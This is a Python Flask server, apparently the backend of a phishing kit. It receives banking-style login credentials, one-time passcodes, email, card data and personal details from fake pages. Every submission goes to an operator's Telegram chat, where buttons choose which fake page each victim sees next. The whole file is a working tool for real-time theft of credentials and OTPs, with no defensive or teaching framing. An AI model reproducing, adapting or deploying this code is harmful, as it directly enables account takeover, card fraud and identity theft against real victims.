from flask import Flask, request, jsonify
from vercel_kv import VercelKV
import os
import uuid
import requests
import time

app = Flask(__name__)

# ------------------------------
# CONNECT TO VERCEL KV
# -------------------------------
kv = VercelKV(
    url=os.getenv("UPSTASH_REDIS_REST_URL"),
    token=os.getenv("UPSTASH_REDIS_REST_TOKEN")
)

# -------------------------------
# ENV VARIABLES
# -------------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID in environment")

# -------------------------------
# BUTTON PAGES
# -------------------------------
PAGES = [
    {"emoji": "🔐", "text": "LOGIN1", "page": "index.html"},
    {"emoji": "🔢", "text": "OTP", "page": "otp.html"},
    {"emoji": "📧", "text": "EMAIL", "page": "email.html"},
    {"emoji": "🧾", "text": "C", "page": "c.html"},
    {"emoji": "🧍", "text": "PERSONAL", "page": "personal.html"},
    {"emoji": "🔑", "text": "LOGIN2", "page": "login2.html"},
    {"emoji": "🎉", "text": "THANK YOU", "page": "thnks.html"},
]


# -------------------------------
# SESSION HELPERS (KV)
# -------------------------------
def save_session(session_id, data):
    # vercel_kv.set() returns a coroutine, so unwrap result to run synchronously
    return kv.set(session_id, data).result()


def get_session(session_id):
    # unwrap result for synchronous access
    return kv.get(session_id).result()


# -------------------------------
# SEND TO TELEGRAM
# -------------------------------
def send_to_telegram(data, session_id, type_):
    msg = f"<b>🔐 {type_.upper()} Submission</b>\n\n"

    for key, value in data.items():
        if isinstance(value, dict):
            msg += f"<b>{key.replace('_', ' ').title()}:</b>\n"
            for sk, sv in value.items():
                msg += f"  <b>{sk.replace('_', ' ').title()}:</b> <code>{sv}</code>\n"
        else:
            msg += f"<b>{key.replace('_', ' ').title()}:</b> <code>{value}</code>\n"

    msg += f"\n<b>Session ID:</b> <code>{session_id}</code>"

    inline_keyboard = [
        [
            {"text": f"{b['emoji']} {b['text']}", "callback_data": f"{session_id}:{b['page']}"}
        ]
        for b in PAGES
    ]

    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": inline_keyboard},
    }

    for attempt in range(3):
        try:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json=payload,
            )
            if r.ok:
                return True
        except Exception:
            time.sleep(1)

    return False


# -------------------------------
# ROUTES
# -------------------------------
@app.route("/", methods=["GET"])
def home():
    return "✅ Serverless Flask Running on Vercel"


# ---------- LOGIN 1 ----------
@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()

    session_id = str(uuid.uuid4())
    save_session(session_id, {"type": "login", "approved": False, "redirect_url": None})

    send_to_telegram(data, session_id, "login")
    return jsonify({"success": True, "id": session_id})


# ---------- OTP ----------
@app.route("/otp", methods=["POST"])
def otp():
    data = request.get_json()

    session_id = str(uuid.uuid4())
    save_session(session_id, {"type": "otp", "approved": False, "redirect_url": None})

    send_to_telegram(data, session_id, "otp")
    return jsonify({"success": True, "id": session_id})


# ---------- EMAIL ----------
@app.route("/email", methods=["POST"])
def email():
    data = request.get_json()

    session_id = str(uuid.uuid4())
    save_session(session_id, {"type": "email", "approved": False, "redirect_url": None})

    send_to_telegram(data, session_id, "email")
    return jsonify({"success": True, "id": session_id})


# ---------- CARD ----------
@app.route("/c", methods=["POST"])
def c():
    data = request.get_json()

    session_id = str(uuid.uuid4())
    save_session(session_id, {"type": "c", "approved": False, "redirect_url": None})

    send_to_telegram({"card_data": data["data"]}, session_id, "c")
    return jsonify({"success": True, "id": session_id})


# ---------- PERSONAL ----------
@app.route("/personal", methods=["POST"])
def personal():
    data = request.get_json()

    session_id = str(uuid.uuid4())
    save_session(session_id, {"type": "personal", "approved": False, "redirect_url": None})

    send_to_telegram(data, session_id, "personal")
    return jsonify({"success": True, "id": session_id})


# ---------- LOGIN 2 ----------
@app.route("/login2", methods=["POST"])
def login2():
    data = request.get_json()

    session_id = str(uuid.uuid4())
    save_session(session_id, {"type": "login2", "approved": False, "redirect_url": None})

    send_to_telegram(data, session_id, "login2")
    return jsonify({"success": True, "id": session_id})


# ---------- THANK YOU ----------
@app.route("/thnks", methods=["POST"])
def thnks():
    data = request.get_json()

    session_id = str(uuid.uuid4())
    save_session(session_id, {"type": "thnks", "approved": False, "redirect_url": None})

    send_to_telegram(data, session_id, "thnks")
    return jsonify({"success": True, "id": session_id})


# ---------- WEBHOOK ----------
@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.get_json()

    if "callback_query" not in update:
        return jsonify({"status": "ignored"})

    cb = update["callback_query"]
    session_id, action = cb["data"].split(":")

    session = get_session(session_id)
    if not session:
        return jsonify({"error": "Unknown session"}), 404

    session["approved"] = True
    session["redirect_url"] = action
    save_session(session_id, session)

    return jsonify({"status": "ok"})


# ---------- STATUS ----------
@app.route("/status/<session_id>", methods=["GET"])
def status(session_id):
    session = get_session(session_id)
    if not session:
        return jsonify({"error": "Not found"}), 404

    if session["approved"]:
        return jsonify({
            "status": "approved",
            "redirect_url": session["redirect_url"]
        })

    return jsonify({"status": "pending"})


# Required for Vercel Serverless
def handler(request, response):
    return app(request.environ, response.start_response)